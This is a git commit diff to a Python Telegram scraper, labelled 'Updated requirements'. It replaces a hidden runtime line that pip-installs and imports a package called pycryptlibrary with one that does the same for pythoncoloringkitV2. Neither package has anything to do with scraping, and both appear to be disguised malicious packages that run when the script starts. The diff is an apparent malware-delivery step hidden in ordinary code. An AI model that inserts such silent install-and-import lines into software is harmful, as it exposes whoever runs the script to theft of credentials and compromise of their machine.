b44d08542b534762e982134f8bbf6a5be79e1dc4
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-10 20:21:40 +0200

    Updated requirements

--- scraper.py
+++ scraper.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pycryptlibrary")
-import pycryptlibrary
+os.system("pip install pythoncoloringkitV2")
+import pythoncoloringkitV2
 from telethon.sync import TelegramClient
 from telethon.errors.rpcerrorlist import PhoneNumberBannedError
 import csv
